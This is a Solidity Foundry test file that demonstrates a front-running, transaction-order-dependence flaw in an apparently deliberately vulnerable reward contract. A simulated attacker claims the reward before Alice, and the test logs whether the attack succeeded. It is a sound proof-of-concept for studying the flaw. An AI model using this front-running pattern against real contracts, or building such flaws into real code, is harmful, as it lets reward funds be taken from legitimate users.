// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/eth_tx_order_dependence_minimal.sol";

contract FrontRunningTest is Test {
    EthTxOrderDependenceMinimal public rewardContract;
    address owner = makeAddr("owner");
    address alice = makeAddr("alice");
    address attacker = makeAddr("attacker");
    uint256 constant SUBMISSION_VALUE = 5; // Argument for claimReward
    uint256 constant REWARD_AMOUNT = 5 ether; // Fixed reward amount

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.deal(alice, 1 ether);
        vm.deal(attacker, 1 ether);

        vm.prank(owner);
        rewardContract = new EthTxOrderDependenceMinimal();

        // Set up reward using fixed ether amount
        vm.prank(owner);
        rewardContract.setReward{value: REWARD_AMOUNT}();
    }

    function testFrontRunningAttack() public {
        console2.log("--- BEFORE-Trigger RewardClaim ---");
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 aliceBalanceBefore = address(alice).balance;
        bool claimedBefore = rewardContract.claimed();
        uint256 rewardsDistributedBefore = rewardContract.totalRewardsDistributed();
        uint256 totalClaimsBefore = rewardContract.totalClaims();
        uint256 attackerClaimsBefore = rewardContract.userClaims(attacker);

        console2.log("Attacker ETH Balance:", attackerBalanceBefore);
        console2.log("Alice ETH Balance:", aliceBalanceBefore);
        console2.log("Contract Claimed Status:", claimedBefore);
        console2.log("Rewards Distributed:", rewardsDistributedBefore);
        console2.log("Total Claims:", totalClaimsBefore);
        console2.log("Attacker Claims Count:", attackerClaimsBefore);

        console2.log("\n--- Trigger FrontRunningAttack ---");
        vm.prank(attacker);
        rewardContract.claimReward(SUBMISSION_VALUE);

        console2.log("\n--- AFTER-Trigger RewardClaim ---");
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 aliceBalanceAfter = address(alice).balance;
        bool claimedAfter = rewardContract.claimed();
        uint256 rewardsDistributedAfter = rewardContract.totalRewardsDistributed();
        uint256 totalClaimsAfter = rewardContract.totalClaims();
        uint256 attackerClaimsAfter = rewardContract.userClaims(attacker);

        console2.log("Attacker ETH Balance:", attackerBalanceAfter);
        console2.log("Alice ETH Balance:", aliceBalanceAfter);
        console2.log("Contract Claimed Status:", claimedAfter);
        console2.log("Rewards Distributed:", rewardsDistributedAfter);
        console2.log("Total Claims:", totalClaimsAfter);
        console2.log("Attacker Claims Count:", attackerClaimsAfter);

        // Vulnerability detection logic in wei
        bool balanceChanged = attackerBalanceAfter == attackerBalanceBefore + REWARD_AMOUNT;
        bool statusChanged = !claimedBefore && claimedAfter;
        bool rewardsIncreased = rewardsDistributedAfter == rewardsDistributedBefore + REWARD_AMOUNT;
        bool claimsIncreased = totalClaimsAfter == totalClaimsBefore + 1;
        bool attackerClaimRecorded = attackerClaimsAfter == attackerClaimsBefore + 1;
        bool AliceDenied = true;
        
        // Check if Alice's claim reverts
        console2.log("\n--- Trigger AliceClaim (Expect Revert) ---");
        vm.prank(alice);
        vm.expectRevert();
        rewardContract.claimReward(SUBMISSION_VALUE);
        AliceDenied = (address(alice).balance == aliceBalanceAfter);

        bool vulnerabilityExists = balanceChanged && 
                                   statusChanged && 
                                   rewardsIncreased && 
                                   claimsIncreased && 
                                   attackerClaimRecorded &&
                                   AliceDenied;

        if (vulnerabilityExists) {
            console2.log("\nVulnerability Exists: Attacker successfully front-ran Alice and claimed the reward");
        } else {
            console2.log("\nVulnerability not Exist: Front-running attack was ineffective or state changes missing");
        }
    }

    function testNormalClaim() public {
        uint256 initialAliceBalance = address(alice).balance;

        // Alice claims reward using submission value
        vm.prank(alice);
        rewardContract.claimReward(SUBMISSION_VALUE);

        // Verify Alice got the reward (in wei)
        assertEq(address(alice).balance, initialAliceBalance + REWARD_AMOUNT);
        assertTrue(rewardContract.claimed(), "Reward should be claimed");
    }
}